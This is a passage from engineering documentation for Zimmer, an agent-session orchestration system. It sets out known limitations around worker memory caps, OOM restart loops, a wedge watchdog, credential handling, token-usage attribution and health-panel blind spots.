So on staging the `transcript_archive` cron key is also disabled at runtime, in the
`good_job_settings` table (`cron_keys_disabled`), which is what actually stops the loop. That is a
live database row rather than anything in this repository, so it survives deploys and is invisible
in the config: staging builds no transcript archives until someone runs
`GoodJob::Setting.cron_key_enable("transcript_archive")`.

That row is still set. Re-enabling it is what would prove #495's fix against a real corpus, and it is
also the reason the fix could not be verified on staging before shipping — the environment kept for
reproducing this has the job switched off in a place no deploy reaches. Nothing re-enables it
automatically; someone has to, once, and watch the first few ticks.

Production's worker carries `memory: 10g` (`config/deploy.production.yml`), for the same reason and
with the same effect — but the number is derived from its own droplet rather than copied, and the
runaway it is sized against is a different one. On production the dominant consumer is not #495 but
[#449](https://github.com/tadasant/zimmer/issues/449): the `good_job` process itself climbs from
~700 MB at rest to **11.6 GB RSS in about eighteen minutes** under ten to thirteen concurrent
sessions, and then dies. Why it grows is still unknown.

Uncapped, that climb is what the 16 GB is spent on. Measured on 2026-08-14, the host reached 139 MB
available with 40% iowait and a load average of 13.57 on 8 vCPU; single-row `SELECT`s took 31
seconds, the queue backed up until it paged, and every agent session on the box slowed down — and
the process died at the end of it anyway, taking each session's child process with it. So the cap
does not decide whether the worker restarts. #449 does that either way. The cap decides whether the
restart is preceded by several minutes of host-wide thrash.

`10g` sits between two measured bounds. Below it, a healthy worker must never reach the cap: 1.6 GiB
of anon at three concurrent sessions. Staging's `2g` sits *under* that floor, which is why copying
that number here would have OOM-killed the worker on the deploy that applied it. Above it, the cap
has to trip before the host degrades: #449's thrash set in at 11.6 GB, so `10g` stops short of it
and still leaves 5.6 GiB against the 0.9 GiB everything else on the droplet actually uses.

One thing is deliberately not claimed: that `10g` sits above the worker's true peak demand. The
per-session figure behind the floor was taken at three concurrent sessions, #449 was observed at ten
to thirteen, and nothing establishes that the cost per session stays linear in between — so a heavy
enough load may reach the cap. That is accepted rather than solved. At that same load, uncapped,
#449 already ends in a dead worker about twenty minutes in; the cap does not add a failure, it
relocates one out of the host and into a cgroup, before the box has spent minutes thrashing on the
way there.

The margin was also read as comfortably above #495's 2.8 GB, and therefore as meaning that job could
not become a restart loop on production the way it does on staging. That inference was wrong, and
[#719](https://github.com/tadasant/zimmer/issues/719) is what it cost. 2.8 GB is what the allocation
costs *on staging's corpus*; the job loads every session that has a transcript, so its peak is a
function of corpus size, and production's corpus is far larger than staging's. Once fleet telemetry
reached the production droplet on 2026-08-31 it caught the same loop running there — four
`CONSTRAINT_MEMCG` kills in 46 minutes, anonymous memory climbing from a 1.5–2.5 GiB baseline to the
10 GiB cap, on a ten-minute period matching the `transcript_archive` cron exactly. Carrying a figure
measured on one environment's data across to another environment's is the mistake worth not repeating
here: for a job whose allocation is a function of the data it touches, the number does not travel.

None of this fixes #449; it bounds the blast radius. Under sustained heavy load the worker still
restarts and still interrupts the sessions it supervises. What changes is that the rest of the
droplet no longer goes down with it, and headroom stops being asked to do a bound's job — which it
cannot, since an allocation with no steady state has no ceiling any droplet size is guaranteed to
sit above.

Two diagnostic notes, since this one wastes time in a predictable way. `staging.zimmer.tadasant.com`
resolves to a **tailnet** address, and the droplet's firewall allows inbound UDP/41641 only — so a
curl from off the tailnet times out whether staging is healthy or not, and that timeout is never
evidence of anything. And a Kamal `RestartCount` climbing into the hundreds on the worker is the
signature of this loop rather than of a crash on boot. Reach for `dmesg -T | grep oom-kill` before
the application logs, which show nothing at all across the window. Grep that line rather than the
`Out of memory: Killed process` one: the victim line names the process but not the scope, and it is
the `oom-kill:` line that carries both `global_oom` — host-wide, every cgroup at risk — and
`task_memcg=/system.slice/docker-<id>.scope`, which is the container ID to blame.

---

## The worker wedge is detected and reported, not fixed

A cgroup OOM under `sysbox-runc` can leave the worker container reporting `running` with
`Restarts=0` while every `docker exec` into it fails, so it runs nothing while looking
healthy ([#502](https://github.com/tadasant/zimmer/issues/502)). `zimmer-worker-watchdog`
catches that — a real `docker exec` on a 60-second timer, on the host, outside the thing it
is watching. See [When the worker wedges](/operate/nested-docker/#when-the-worker-wedges).

What it does **not** do is make the failure survivable, and five gaps are worth stating.

**The last rung of recovery is manual.** The watchdog kills the container's shim and
retries `docker start`, which is where the wedge usually ends: `sysbox-mgr` refuses the
container id it already holds (`redundant container registration`), and only a *new* id
gets past that. Creating one needs a redeploy, and nothing on the host can run one — so the
automated path stops at a container in `exited` and keeps paging — once a wedge has been
reported, the watchdog repeats "no worker is running" on its re-alert throttle until a
healthy worker exists, because `docker ps` stops listing the container and the probe would
otherwise go silent. That is deliberate: `docker rm` cannot be undone from the host, so a misfire would
turn a wedged worker into no worker.

**The root cause inside sysbox is still unknown.** Nobody has established *why* the
namespace becomes unusable after the OOM, only that it does and that every documented
Docker recovery path fails. The watchdog treats a symptom.

**Detection has to be installed, and on production nothing in this repository installs it.**
`Deploy staging` converges the timer on every deploy. The installer now takes the two knobs a
different deploy path needs — `ZIMMER_WATCHDOG_SSH_EXTRA` for how to reach the host and
`ZIMMER_WATCHDOG_RECOVER` for whether recovery is armed — but the production deploy workflow
that would call it lives in the private companion repo, and until it does, production has no
detection at all, silently.

**The trigger is not always the OOM, and the impact is not measured.** The signature the
watchdog fires on — running container, failing `docker exec` — is shared by at least one
condition that is not a cgroup OOM at all: two hosts wedged twelve minutes apart on
2026-09-02 with `OOMKilled=false`, `oom_kill=0` and five live workload processes each
([#774](https://github.com/tadasant/zimmer/issues/774)). The alert does not assert #502's
cause or an idle worker on that evidence — it reports the cause as unknown, and reports impact
as unverified with N processes alive — but that is as far as the payload goes. Nothing here
establishes whether jobs are still executing inside a wedged worker; answering that still means
reading the app's logs and the queue's head age by hand.

**Delivery depends on the web container.** The alert reaches Slack by running
`bin/rails zimmer:worker_wedge_alert` inside the *web* container, because the worker is the
broken thing and the Slack credentials live in Rails' encrypted credentials rather than
anywhere a host script can read. If web is also down — a whole-host OOM rather than a
cgroup-scoped one — the incident is still written to
`/var/lib/zimmer-worker-watchdog/incidents/` and to journald, but nobody is paged.

---

## The phantom re-pick guard is process-local

`AgentSessionJob::LIVE_EXECUTIONS` is what tells a real interruption apart from a row GoodJob
re-picked out from under a live execution — see [a live execution is not an
interruption](/sessions/lifecycle/#a-live-execution-is-not-an-interruption). It is an in-memory
set, and that is deliberate: a worker that genuinely died has to take its entries with it, or the
guard would stand down on exactly the sessions that need recovering.

The cost is that it only answers for the process it lives in. A re-pick that lands in a *second*
worker process finds an empty set, concludes nothing is running, and takes the recovery path —
delivering the nudge this guard exists to suppress. Zimmer's `worker` role is one container on one host running one
`bundle exec good_job start` (`config/deploy.production.yml`), so today every re-pick lands where
the entry is; scaling that role horizontally would see the old behaviour return in proportion to
how often the poll lands on the other process.

There is no durable version of the signal available. GoodJob writes no `locked_by_id` under the
`:advisory` strategy, so the row itself records nothing about who is executing it, and a PID check
cannot distinguish a live execution from a [reparented
orphan](/sessions/spawning/#one-live-agent-process-per-session) whose monitor really did die.

The same set is what `CleanupOrphanedSessionsJob` and `DeploymentRecoveryJob` consult before
calling a `running` session orphaned, and GoodJob's cron runs inside the worker, so today all
three actors read the same set. Scaling the `worker` role past one container splits them.

---

## Two narrow gaps in the InterruptError stand-down

`AgentSessionJob#handle_interrupt_error` stands down when a session has already come to rest — in
`needs_input` after a normal turn completion, or in `waiting` after a deliberate sleep. Two narrower
gaps remain, both deliberate:

- The status is read once, before the guard. A session that pauses in the moment *between* that read
  and the guard falls through to the old behaviour. The window is small and the failure is the
  pre-existing one, so it is left rather than papered over with a lock.
- Standing down leaves `running_job_id` pointing at the dead job where the recovery path would have
  cleared it. That is what the orphan sweep is for, and it only reaches sessions in `running` or
  carrying `paused_by: "recovery"` — a session at rest with a stale job id is inert, but it is not
  tidied either.

## The historical backfill sweeps forward only, and "complete" means one pass

`TokenUsageBackfillJob` walks transcript directories in sort order and records a cursor. A directory
created *while a run is in flight* that sorts **before** the cursor is never visited by that run.
That is deliberate rather than an oversight: a directory created mid-run holds files written
mid-run, and `TokenUsageIngestionJob`'s two-hour lookback on a 10-minute cron already has them. But
it does mean the backfill alone is not a coverage proof — the two jobs are, together.

Two consequences worth knowing:

- **`complete` means "one pass finished", not "the ledger is exhaustive".** A transcript that was
  unreadable when its chunk ran (a permission error, a file deleted mid-scan) is skipped, the chunk
  still commits, and the run still finishes. `covers_since` on the Costs page is the oldest row
  actually stored, which is the honest figure; nothing claims every call ever made is in there.
- **A transcript root that gets emptied is invisible.** If `~/.claude/projects` is wiped, a re-scan
  completes instantly against nothing and the ledger keeps whatever it already had. The rows are
  durable, so this loses no history — but a fast, clean "complete" is not evidence that the corpus
  was read.

`progress_pct` is also approximate while a run is in flight: the denominator is re-derived each
slice from the directories still ahead of the cursor, so it moves as clones are created and cleaned
up. It is a progress bar, not an accounting.

---

---

## Context-feature attribution is an estimate with a large residual

`token_usage_features` says which context-management feature a request's tokens paid for.
Nothing in the API supports that: the `usage` object is a per-request total with no
per-content-block decomposition, so every figure in that table is derived from transcript
content rather than measured.

The estimate is built not to mislead — shares are divided by `max(estimated, actual)` so the
parts cannot exceed the whole, and the shortfall is carried as an explicit unattributed line
— but the shortfall is big. On this deployment about **56% of tokens** land there. Three
things account for most of it, and none is fixable from this side (a fourth, below, is smaller):

- The harness system prompt and the tool schemas of every attached MCP server are in every
  priced prompt and in no transcript. This is the bulk of it, and it is a per-request
  *constant*, so it dominates short conversations.
- Extended thinking is written to the transcript as `thinking: ""` plus a signature. Across
  955 thinking blocks in the recent corpus, not one retained its text. The signature is
  counted; the reasoning is not.
- System reminders — including the injected CLAUDE.md — are usually not persisted either.
- A turn whose prompt cache has expired re-writes the whole prefix, so its
  `cache_creation_input_tokens` covers content the attributor is holding as already-carried.
  The estimate for that turn stays small and the re-write lands in the residual. Those are the
  expensive turns, and the content being re-written is exactly the always-appended material the
  page exists to indict, so the residual is understating the very thing it is asked about.

So the table ranks features against each other honestly and does **not** account for the
majority of the bill. Read it as "of the context I can see, here is the split", and do not
cut a feature on a thin margin.

## A feature detector can only be backfilled as far as transcripts survive

Adding a detector is one entry in `ContextFeatureRegistry` plus a re-ingest, and because
ingestion is an idempotent scanner over files on disk, the new detector is applied to
history for free. That is bounded by Claude Code's own retention of
`~/.claude/projects`, which on this deployment holds about **30 days** in bulk.

The usage rows themselves are unaffected — they are already stored, and their totals do not
change. Only the per-feature split is limited: a detector added today cannot explain spend
from three months ago, because the evidence it would read has been pruned. Nothing warns
about this; the older part of the window simply shows a larger unattributed share.

## Experimental-setting cohorts are observational, and the first one is purely temporal

The Costs page compares spend on each side of an experimental setting. Nothing about it is a
controlled experiment, and three limits are worth stating rather than discovering:

- **The settings are global.** A cohort is "every session that ran while the setting was on",
  not a random assignment. Whatever else changed over the same stretch is inside the cohort.
- **A backfilled setting's cohorts are a date, not a treatment.** For `mcp_tool_search`, "off"
  is every session before 2026-08-22 13:55 UTC and "on" is every session after it, so anything
  that landed the same afternoon — including the token-usage accounting changes in #591, two
  hours later — is perfectly confounded with the setting. This is stated on screen next to the
  number, but no amount of stating fixes it: only toggling the setting back and forth, which
  makes the cohorts interleave in time, produces a comparison the data can carry.
- **Normalization is partial.** Cost per API call divides out session length. It does not
  divide out which model ran or what the work was. The paired-by-root drilldown holds the
  agent root constant; it holds nothing else constant.

The report refuses to print a percentage when a side has fewer than 5 sessions or 50 API calls
in the window, and it excludes sessions whose start and end values disagree. Those guards stop
the most obvious wrong readings. They do not turn an observational comparison into a causal
one, and a thin report saying "not enough data to compare" is the correct output, not a bug.

## Session-scoped Claude credentials have no rollback

Every Claude Code session gets its credentials from the DB row — an access token through
`CLAUDE_CODE_OAUTH_TOKEN`, its own `CLAUDE_CONFIG_DIR` — and there is no other mode
([the DB owns the chain](/auth/harness/#session-scoped-credentials-the-db-owns-the-chain)). The
shared-file machinery that used to be the fallback — the owner marker, `sync_tokens_from_filesystem!`,
`write_credentials_to_filesystem!`, the symmetric write guard, `credentials_blob_for_disk`, the
completeness guards on read and write, the corruption self-heal, `RefreshRuntimeAuthTokensJob`'s
"wait for a filesystem sync" recovery plan — is gone, along with the Settings → Experimental toggle
that guarded it.

Three consequences to know:

- **There is nothing to switch back to.** If the mechanism misbehaves, the fix is a code change and
  a deploy, not a setting. Recovery from a broken credential is the same one gesture in every case:
  **Authenticate** the account from `/inference`, which writes the row, and the next spawn reads
  the new token out of it. `~/.claude/.credentials.json` may still exist on a worker as a fossil;
  nothing reads it, and its contents mean nothing.
- **A spawn with no usable current account fails, and does not park.** It used to fall back to
  the shared file. `ClaudeSpawnEnv` now raises `MissingCredentialsError`, `ProcessLifecycleManager`
  refuses the spawn at `.warn`, and the session fails with `failure_reason: spawn_failed` and a
  session-log line naming the account. Correct — a session that cannot authenticate cannot work —
  but it is a **failed** session rather than a parked one, unlike a pool that drains mid-session,
  which `AuthOutageParkService` puts to sleep and wakes when the pool recovers. The park machinery
  is built around a turn that reached the runtime; this happens before there is a process, and a
  first turn parked here would be resumed with a recovery prompt in place of the prompt it never
  delivered. So the session has to be restarted by hand once an account is authenticated.
  `AuthWarmupService` settles the pool at worker boot so the ordinary deploy never reaches it.
- **A revoked MCP credential is not removed from other sessions' stores.** Revoking through
  `McpOauthCredentialInjector#delete_runtime_credentials` reaches the revoking session's own store,
  but a *different* session already running keeps its copy until it ends. New sessions get a fresh
  directory, so the window is one session's lifetime, not indefinite.

The `session_scoped_credentials_enabled` column is still on `app_settings`, ignored by the model:
phase 1 of the [two-phase drop](/operate/deploying/#dropping-a-column-takes-two-deploys). A later
PR removes it.

## An MCP token rotated on a Claude session's last turn is not captured

Claude Code refreshes MCP OAuth tokens mid-session and writes the rotated pair into its session's
own `.credentials.json`. Zimmer adopts it back into `McpOauthCredential` at the session's next
injection — every spawn and follow-up runs `McpOauthRuntimeReconciler` over that session's store
([write-back](/auth/mcp-oauth/#capturing-the-token-the-runtime-rotates-write-back)). A rotation
that happens on a session's **last** turn has no next injection, so it is never read: the DB keeps
the pair the provider has since rotated away, and the next session to use that server presents a
dead refresh token, gets `invalid_grant`, and a human re-authorizes.

`RefreshMcpOauthTokensJob` used to look like it covered this, and it did not. The cron read the
host-global `~/.claude/.credentials.json`, which under per-session directories no session writes;
it could only ever adopt a fossil, and `adoptable?`'s strictly-newer rule meant it never did. It now
skips Claude Code outright rather than reading a file nothing writes. Closing the gap for real
means reconciling a session's store when the session is reaped, and that is not built.

## An agent that never calls `get_session_provenance` never learns it has a hierarchy

Zimmer injects nothing about provenance into a session's turns — no `<session-hierarchy>` block, no
`<human-messages>` block. The lineage graph and the human-message record are served by the
`get_session_provenance` MCP tool, on demand, and that tool's description carries every caveat the
injected blocks used to state. See [Hierarchy and human
messages](/sessions/hierarchy-and-human-messages/#where-they-show-up).

The cost is discoverability, and it is real. An injected block is unmissable: a session that never
thought to ask about its lineage learned it had one anyway, and learned that only `here` messages
were spoken to it. A tool is not. An agent that never calls it will not find out that a human said
something to the router above it, will not know which siblings share its goal, and nothing in its
turn will prompt it to look. The failure is silent in the worst direction — the session proceeds as
if no human context existed, which is indistinguishable from there being none.

Three things bound it rather than fix it: the tool is in the `self_session` group, so every session
carries it; its description leads with the instruction to call it before relying on what a human
asked for; and a test asserts each caveat is present in that description, so it cannot be shortened
into uselessness. None of that makes an agent call it.

The trade is deliberate. The blocks were re-injected on every turn of every session and billed again
on each later turn they stayed in context, while most sessions never read an older human message.
Whether the outcome cost exceeds the token saving is not something the current instrumentation can
answer: the Costs page shows `session_hierarchy` and `human_messages` trending to zero and
`provenance_tool` picking up, which measures the bytes, not the decisions.

## A restart from scratch can still page before its re-clone finishes

`TranscriptPollerService` decides how loudly to report a missing `working_directory` from the
session's lifecycle state: `waiting` means it was never spawned and logs at INFO, and every
other state logs at ERROR because the spawn should have written the key
([#473](https://github.com/tadasant/zimmer/issues/473), and
[Observability](/operate/observability/#a-lifecycle-state-the-session-has-not-reached-yet-is-logged-at-info-not-error)).

One state disagrees with that reading. `restart_from_scratch` strips `working_directory` along
with the rest of `Session::SETUP_ARTIFACT_KEYS`, resumes the session to `running`, and only
then enqueues the job that re-clones. A poll landing in that window sees a `running` session
with no `working_directory` and pages, on a session a human just deliberately restarted.

The state cannot tell that apart, which is why the split does not try to: a session mid-restart
and a session whose spawn silently failed to record its directory are the same two fields. It
predates the INFO/ERROR split and the split neither causes it nor fixes it. Closing it means a
positive marker for "a re-clone is in flight" rather than a wider exemption — widening the
exemption to "any session without the key" would swallow the defect the ERROR exists to catch.

## Nothing prunes the transcripts the old Claude auth probe left behind

`CliStatusService` used to check Claude Code's auth with `claude whoami`. `whoami` is not a
subcommand and `claude`'s usage line is `claude [options] [command] [prompt]`, so the CLI took
the word as a *prompt* and answered it with a full agent turn — every two minutes, on cron,
for months ([#536](https://github.com/tadasant/zimmer/issues/536)). The check no longer makes
a model call, so the bleeding has stopped.

The debris has not been cleaned up. Each of those runs left a JSONL transcript under
`~/.claude/projects/-rails/`, and tens of thousands of them are still on the `claude_home`
volume. Nothing in Zimmer prunes that directory — `StaleCloneCleanupJob` sweeps clones and
per-session config dirs, not the shared projects tree — and deleting them by hand would need a
shell on the production box, which is exactly the ops shape
[the deploy is supposed to replace](/operate/deploying/). They are inert: `TokenUsageBackfill`
has already ingested them, so they cost disk rather than money or correctness.

## `claude auth status` cannot see the credential Zimmer's containers use

The obvious replacement for the probe above was `claude auth status` — a real subcommand, and
the direct analog of the `gh auth status` and `codex login status` in the same hash. It is the
wrong check here. Verified against CLI 2.1.258, it reports only credentials it finds in the
*environment*: `CLAUDE_CODE_OAUTH_TOKEN` or `ANTHROPIC_API_KEY`. Run from the `web` or `worker`
container's own environment, which carries neither — Zimmer's credential is a DB row that only
reaches a `claude` process as a spawn-time variable — it prints `Not logged in` and exits 1. It
also exits 0 for an `ANTHROPIC_API_KEY` that is pure nonsense, because presence is all it checks.

So the CLI has no invocation that answers "is Zimmer's stored Claude credential usable", and
the check reads `ClaudeCredentialHealth` in-process instead. That is the better answer anyway —
it reads the row a session is handed its token out of
([the DB owns the chain](#session-scoped-claude-credentials-have-no-rollback)) — but it does mean
the Claude Code tile is reporting on
Zimmer's own credential store rather than on what the binary would do if you ran it. Two
consequences worth stating plainly, because the tile does not state them:

**The tile reports presence, not liveness.** `ClaudeCredentialHealth` bottoms out in
`ClaudeAccount.complete_claude_oauth?`, which asks whether an access token and a refresh token
are both there and non-empty. It does not ask Anthropic. A revoked or spent pair sitting in the row
reads as *Authenticated*. `claude whoami` did make a real call, so it was — incidentally, and at
about \$615/mo — the only liveness signal this tile ever had. What catches a dead credential now
is the account pool's own refresh sweep and the auth-outage park, both of which run against the
vendor; the tile is a configuration check, like the three beside it.

**It reports on one account, not on the pool.** `ClaudeCredentialHealth.status` keys off
`ClaudeAccount.current_account`, because that is the row a spawning session is actually handed a
token out of. So the tile can show *Not Authenticated* while a perfectly healthy pool sits behind
it — no row is current yet on a fresh deployment, or the current row's stored pair is incomplete and
`AccountRotationService` would rotate past it on the next spawn. The same narrowing is what the
`/health` Agent Authentication card reports, so the two surfaces agree; `/inference` is the page
that shows the whole pool.

## An empty-turn restart is bounded per incident, not per lifetime

`RetryBudget::EMPTY_TURN` bounds the two vantage points that restart a turn the runtime ended
without writing a conversation — `ProcessLifecycleManager#handle_empty_turn` and
`Sessions::RestartUnstartedTurn`. Until [#727](https://github.com/tadasant/zimmer/issues/727) it
was reset nowhere, which made it a hard cap of two restarts for a session's whole life. It is a
budget now, so the monitor loop hands it back after the process has run stably for
`RetryBudget::EMPTY_TURN_RESET_AFTER` (30 minutes) — thirty times the window every other budget
takes, chosen to clear the 180-second `McpStartupTimeout` dead zone in which a healthy runtime is
up and has legitimately written nothing.

The residual is that the reset measures **uptime**, not output. It never asks whether the process
has produced a line. So a cause that keeps a process alive and silent for more than half an hour
and then exits normally — a hung agent, a tool call that blocks forever, a runtime with no startup
timeout of its own — is restarted about twice an hour indefinitely, where before it was stopped
after two attempts. It is a slow loop rather than a spin, each cycle is a line in the session log,
and the `needs_input` park at the end of a spent budget still happens within any 30-minute window;
but there is no longer a lifetime ceiling on it.

The counter's exhaustion count on `/health` also under-reports the history, because the reset
deletes the counter and its stamp: the fleet-wide `total_retries_attempted` for this budget resets
with each cycle, so a session in the slow loop contributes at most two attempts to the number at
any moment. The reset line in the session's own log (`"Empty-turn restart counter reset (was N) -
process stable for Ns"`) is the durable record.

The narrower fix is to key this one budget's reset on `RuntimeConversationPresence` — hand it back
once the runtime has written a conversation, which is by construction "the incident is over" for a
branch whose whole predicate is that neither store holds one — and let the window drop back to the
house 60 seconds. That needs a reset that can ask a question about the filesystem, which
`RetryBudget` deliberately cannot; it is a value object over `session.metadata`.

## The silent-recovery bound infers a wedge from behaviour; it does not diagnose one

`Sessions::SilentRecoveryGuard` fails a session after `RetryBudget::SILENT_RECOVERY.max` (3)
recovery restarts that started a turn and produced no transcript event
([#988](https://github.com/tadasant/zimmer/issues/988)). That closes the consequence — a session
whose restarts do nothing stops reporting `running` forever — and deliberately does **not** close
the cause. Nobody has established *why* those re-queued jobs wedge between `job_started_at` being
stamped and the runtime writing its first line. The four production sessions all showed every MCP
server stuck at `pending` and a byte-identical `process_identity` across relaunches, which is
suggestive and is not a diagnosis. When the cause is found and fixed, this bound should become
unreachable rather than removed.

Two residuals follow from inferring rather than diagnosing.

**A run of turns interrupted before they write anything is indistinguishable from a wedge.** The
two facts the guard requires — the turn started, and it wrote nothing — are both true of a session
a deploy kills between its spawn and its first transcript line. Four such interruptions in a row,
with no output and no 30-minute stable stretch between them to hand the budget back, fail the
session. That is a deploy storm rather than a wedge, and the session is restartable with its
context intact, but the `failed` status is a misattribution. Sizing the budget at 3 is what keeps
this remote: a session has to be caught in that window four consecutive times.

**The bound is not the same as reconciling the status.** A wedged session still reports `running`
for the roughly 45–90 minutes it takes the 15-minute hung verdict to fire three times, because
nothing asks whether the recorded process exists at the moment the status is read.
`AgentProcessLiveness` could answer that — it is consulted for the session log line now — but
acting on it at the status boundary is a much larger change: the reading is `:unknown` wherever
`/proc` is unavailable or the pid was recorded in another container, and a session mid-way through
its own exit handling is legitimately `running` with a dead pid for a moment. See
[When recovery restarts a session into silence](/sessions/lifecycle/#when-recovery-restarts-a-session-into-silence).

## A heartbeat-beaten session cannot have its task replayed, because the beat overwrote it

When a turn is about to be delivered into a conversation that does not exist, `AgentSessionJob`
replays the work that never happened rather than the nudge it was handed
([#401](https://github.com/tadasant/zimmer/issues/401)). It looks for that work in
`metadata["sent_message"]`, then `session.prompt`, then `metadata["original_prompt"]`, and skips any
candidate that is itself a nudge.

For a session under heartbeat monitoring, the second of those is often gone.
`HeartbeatSweepJob#nudge_needs_input` writes its beat **into the prompt column** —
`session.update!(prompt: AutomatedPrompts::HEARTBEAT, …)` — so once a session has been beaten
even once, the text it was created with is not recoverable from that column. A chat-bubble session
still has `metadata["original_prompt"]` and is replayed from it; a session created any other way
has nothing left to replay, and the fresh conversation is handed the beat, which names no task.
That session wedges exactly as #401 describes: it starts over, finds nothing to do, and comes to
rest looking finished.

Replacing one nudge with another is refused rather than attempted, so the session log says the turn
went out with no work behind it instead of claiming a recovery that did not happen. The real fix is
for the heartbeat to stop overwriting the prompt column — a beat is a turn, not the session's task,
and `deliver_follow_up!` already carries it — but that column is read as "the session's task" by
titling, search and the UI, so changing it is a change to more than the sweep.

## An exception on an archived session's turn is no longer paged, whatever it was

`AgentSessionJob#perform`'s catch-all rescue re-reads the session row, and when it says `archived`
it records the exception on the session's timeline at `warning` and in the backend log at `warn`,
then returns — no `failure_reason`, no `error` line, no re-raise, so neither GlitchTip nor the
log-based alert rule sees it ([#886](https://github.com/tadasant/zimmer/issues/886)). That is the
point: the race it exists for is an archive landing mid-turn and taking the clone with it, which
paged twice for a session that had already finished.

The gate is the row and nothing else, and that is wider than the race. A genuine bug — a
`NoMethodError` in the teardown after the monitoring loop, say — stops paging as soon as the
session it happens on is archived, and self-archiving is routine rather than exotic: an agent can
archive itself through `action_session`, and the merge gate does. Narrowing the gate to "nothing had
been spawned yet" was considered and rejected, because that is precisely where the commonest form of
the race lives: a self-archive enqueues `DeferredCloneCleanupJob`, which deletes the clone about ten
seconds later, while the job is still in its teardown tail holding a pid and touching that clone.

Nothing is lost, but it is one level quieter than it was: the exception class, its message and the
first five backtrace lines are in the backend log at `warn`, and the session's own timeline says the
turn stopped and why. An unexplained gap in an archived session's history is worth grepping the
backend log for before assuming it finished cleanly.

## A root that moves to the repo root still strands its existing sessions

A session freezes its agent root's `subdirectory` at creation time, and a clone that cannot find
that path fails permanently. Renaming a root's directory used to strand every session created before
the rename; both clone paths now also offer the root's *current* path, resolved from the catalog by
`metadata["agent_root_key"]`, and adopt it when the stored one is gone
([#921](https://github.com/tadasant/zimmer/issues/921)).

That recovery only runs in one direction. `Session#catalog_subdirectory` returns `nil` for two
different states — the catalog no longer carries the root at all, and the root resolved but declares
no `subdirectory` — and the clone treats both as "no fallback offered". So a root whose tree is
moved **to the repo root** leaves its existing sessions naming a directory that no longer exists,
with nothing to fall back to: they fail exactly as before, permanently, on both unarchive and
clone recreation.

The workaround is the same edit that would have been needed anyway: keep the root's directory under
*some* path in the catalog, or move the affected sessions' `subdirectory` column yourself. Telling
the two states apart — and letting a resolved-but-blank fallback mean "clone at the repo root" — is
the real fix, and it is not implemented.

## `recent_errors` sees only what Zimmer writes to a table

`system_health.recent_errors` is the union of two durable error stores: session error logs (the
`logs` table) and background job failures (`good_jobs.error`). Between them they cover an error that
happened inside a session, and an error that a job raised, retried on or was discarded for.

They do not cover an error that only ever reaches **stdout** — a connection failure inside GoodJob's
own poller, anything raised before a job row could be written, anything in the Rails request cycle
that Zimmer logs rather than persists. Zimmer has no queryable store of the Rails log; that is what
the [observability stack](/operate/observability/) is for.

That gap is exactly the shape of the ten-hour outage this field was reported on
([#428](https://github.com/tadasant/zimmer/issues/428)): the application log emitted a
database-connection error about 36 times a minute for ten hours and `recent_errors` stayed `[]` the
whole time, because the errors were never written anywhere it can read. So **`[]` here means "no
error was recorded", never "nothing is wrong"** — the `/health` panel says so in as many words. It
is also why the `system_health` *status* does not depend on this field: catching that outage is
[`execution_stall`](/operate/background-jobs/#when-nothing-is-executing)'s job, and it reads
completions rather than errors.

## Process health counts only what the container serving the page can see

Every number in the `/health` **Process Health** panel — Active, Tracked, Orphaned — is measured
inside the operating-system process that renders it, and in production none of them can see an agent
process:

- **Tracked** reads a `ProcessRegistry`, which is an in-memory Hash belonging to the
  `SystemProcessManager` instance. `HealthMonitorService#initialize` builds a fresh one per report,
  so it holds the processes *this report* spawned — none, always.
- **Active** is a `pgrep` of the current user's processes, which sees one container.
  `ConnectionBudget` puts GoodJob in `:external` mode in production, so agent CLIs are children of
  the **worker** container while `/health` is served from **web**.
- **Orphaned** is derived from Active, so it inherits both.

Before [#428](https://github.com/tadasant/zimmer/issues/428) this was reported as `0 / 0 / 0` with
the status `healthy — No orphaned processes`, in payloads that said five sessions were running. A
counter that structurally cannot observe the processes it counts can never report an orphan, and its
zero means *not knowable from here*, not *none exist*.

The report no longer makes that claim: it reads the one record of an agent process that is durable
and cross-container — `Session.metadata`'s `process_pid` and `process_identity`, classified by
`AgentProcessLiveness` — reports it as **Recorded**, and when sessions hold recorded processes that
none of the local counters can see, the section's status is `unknown` rather than `healthy`. An
`unknown` sub-check does not colour the overall status green *or* page anyone; `overall_status` says
"N could not be evaluated" instead of "All systems operational".

**Recorded counts `running` sessions only**, and that is a second limitation rather than an
oversight. `process_pid` is a single metadata slot that nothing clears when a turn ends, so every
parked `waiting` session still names a process that exited hours ago. Counting those would hold the
whole report at `unknown` for ever on an instance with no agent process anywhere on it — and a
permanent caveat reads as noise and gets ignored exactly like the false `healthy` it replaced. The
cost is that a process orphaned by a session that has since parked is invisible to this count.

What is still **not** fixed is orphan detection itself. On a production deployment, nothing counts
or reaps orphaned agent processes from the web container, and the "Clean Up Orphaned Processes"
button there acts on a set that is always empty. `AgentProcessLiveness.ensure_no_live_process!` is
what actually keeps a stale agent process from surviving into the next turn, and it runs on the
spawn path in the worker, where the pid means something.

## A transient boot failure that exhausts its retries still fails invisibly

`Sessions::ParkUndeliveredTurn` moves a turn that died before the agent started out of `failed` and
into the `needs_input` action queue, so the prompt it was carrying is not dropped in silence
([#439](https://github.com/tadasant/zimmer/issues/439)). It declines to do that for the three
exception classes `AgentSessionJob` declares a `retry_on` for — `Timeout::Error`,
`Errno::ECONNRESET`, `Errno::ETIMEDOUT` — while another attempt is still queued, because parking
would announce an ending in the action queue while a retry was still going to run the same prompt,
and a human acting on that announcement would race the retry into delivering it twice.

The cost is stated rather than designed around: the **last** of those attempts still lands in
`failed`, where nothing sweeps it and the homepage does not show it. A boot failure that is
transient three times running is therefore exactly as invisible as it was before. The park covers
the deterministic failures, which is the observed shape — the reported case was an `ENOENT` on a
clone that was wrong and stayed wrong.

This applies only to a turn that was **carrying a prompt**. A session's *first* turn carries none,
and since [#785](https://github.com/tadasant/zimmer/issues/785) it is retried on its own bounded
ladder rather than parked — see [A failure before the first agent turn is retried, not
failed](/sessions/lifecycle/#a-failure-before-the-first-agent-turn-is-retried-not-failed).

Fixing it properly means either parking only on the final attempt (which needs the per-exception
retry counter ActiveJob keeps privately, not the total this code reads) or making the park itself
the thing that re-delivers, which reopens the double-run hazard of
[#400](https://github.com/tadasant/zimmer/issues/400).

## A session retrying its bootstrap looks exactly like a session that has not started yet

`AgentSessionJob#retry_bootstrap_failure` leaves a session that died before its first agent turn in
`waiting`, and `waiting` is also what every brand-new session is. The retry is recorded on the
session itself — the catch-all's `error` line and backtrace, a `warning` explaining the re-queue,
and `bootstrap_retry_count` in metadata — but nothing rolls it up: `HealthMonitorService#failure_reason_distribution` and `#recent_failures` both query
`status: :failed`, and there is no scope for "waiting, on its third bootstrap attempt".

